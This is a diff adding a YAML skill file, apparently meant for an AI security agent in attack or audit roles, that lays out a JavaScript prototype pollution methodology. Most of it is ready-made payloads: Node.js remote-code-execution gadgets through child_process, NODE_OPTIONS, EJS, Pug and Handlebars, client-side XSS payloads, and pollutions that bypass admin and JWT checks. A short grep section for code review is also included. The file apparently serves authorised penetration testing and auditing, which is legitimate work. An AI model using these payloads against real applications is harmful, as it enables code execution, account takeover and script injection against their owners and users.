@@ -1,0 +1,132 @@
+id: prototype-pollution
+name: "JavaScript Prototype Pollution"
+description: "Prototype pollution via __proto__, constructor.prototype, and Object.assign — with gadget chains for RCE, XSS, privilege escalation, and auth bypass."
+version: 1
+applicable_roles:
+  - attack
+  - audit
+tags:
+  - prototype-pollution
+  - javascript
+  - nodejs
+  - rce
+  - xss
+  - auth-bypass
+  - gadget-chain
+triggers:
+  - "__proto__"
+  - "constructor\\.prototype"
+  - "Object\\.assign"
+  - "merge\\("
+  - "deepmerge"
+  - "lodash"
+  - "\\.extend\\("
+  - "prototype.*pollut"
+  - "node_modules"
+  - "express"
+  - "application/json"
+estimated_tokens: 900
+content: |
+  ## JavaScript Prototype Pollution Methodology
+
+  ### Phase 1: Identify Merge/Assign Sinks
+  Look for endpoints that accept JSON and merge it into objects:
+  - `Object.assign(target, userInput)`
+  - `_.merge(target, userInput)` / `_.defaultsDeep(target, userInput)` (lodash)
+  - `$.extend(true, target, userInput)` (jQuery)
+  - Custom recursive merge functions: `deepMerge`, `deepExtend`, `defaults`
+  - Any endpoint accepting nested JSON that gets merged into config/options
+
+  ### Phase 2: Detection Payloads
+  Send via JSON body to merge-capable endpoints:
+
+  **Via `__proto__`:**
+  ```json
+  {"__proto__": {"polluted": "yes"}}
+  ```
+
+  **Via `constructor.prototype`:**
+  ```json
+  {"constructor": {"prototype": {"polluted": "yes"}}}
+  ```
+
+  **Verification**: access a new empty object's `.polluted` property — if it returns `"yes"`, pollution succeeded. In a web context, check if subsequent API responses include unexpected `polluted` fields.
+
+  ### Phase 3: Server-Side RCE Gadgets (Node.js)
+
+  **child_process.spawn/exec via shell option:**
+  ```json
+  {"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
+  ```
+
+  **child_process.fork via NODE_OPTIONS:**
+  ```json
+  {"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
+  ```
+
+  **EJS template RCE (Express + EJS):**
+  ```json
+  {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
+  ```
+  Then trigger any template render — the injected function name executes as code.
+
+  **Pug template RCE:**
+  ```json
+  {"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}
+  ```
+
+  **Handlebars RCE:**
+  ```json
+  {"__proto__": {"main": "\n return process.mainModule.require('child_process').execSync('id').toString()\n"}}
+  ```
+
+  ### Phase 4: Client-Side XSS Gadgets
+
+  **innerHTML/outerHTML pollution:**
+  ```json
+  {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+  ```
+
+  **jQuery $.html() gadget:**
+  ```json
+  {"__proto__": {"div": ["<img src=x onerror=alert(1)>"]}}
+  ```
+
+  **DOM clobbering via prototype:**
+  ```json
+  {"__proto__": {"src": "javascript:alert(1)", "href": "javascript:alert(1)"}}
+  ```
+
+  ### Phase 5: Auth Bypass and Privilege Escalation
+
+  **isAdmin / role pollution:**
+  ```json
+  {"__proto__": {"isAdmin": true}}
+  {"__proto__": {"role": "admin"}}
+  {"__proto__": {"admin": true}}
+  {"__proto__": {"verified": true}}
+  ```
+  If the app checks `user.isAdmin` and that property is not explicitly set on the user object, it inherits from the polluted prototype.
+
+  **JWT verification bypass:**
+  ```json
+  {"__proto__": {"algorithms": ["none"]}}
+  ```
+  Pollutes the jsonwebtoken verify options — accepts `alg: none` tokens.
+
+  ### Phase 6: Detection in Source Code Review
+  Grep for dangerous patterns:
+  ```
+  grep -rn "Object.assign\|\.merge(\|deepmerge\|defaultsDeep\|\.extend(" --include="*.js" --include="*.ts"
+  grep -rn "__proto__\|constructor\[" --include="*.js" --include="*.ts"
+  ```
+  Check if any of these functions receive user-controlled input (req.body, req.query, parsed JSON).
+
+  ### Phase 7: Recursive Exploitation Strategy
+  1. Find a JSON merge endpoint (POST/PUT/PATCH with JSON body)
+  2. Test with `{"__proto__": {"testprop": "1"}}` and check if other endpoints reflect `testprop`
+  3. If confirmed, escalate via the most impactful gadget:
+     - EJS/Pug/Handlebars → RCE (check which template engine is in package.json)
+     - Auth check on prototype property → privilege escalation
+     - DOM rendering with user data → XSS
+  4. For proof, prefer `id` / `whoami` output via RCE gadgets, or admin panel access via auth bypass
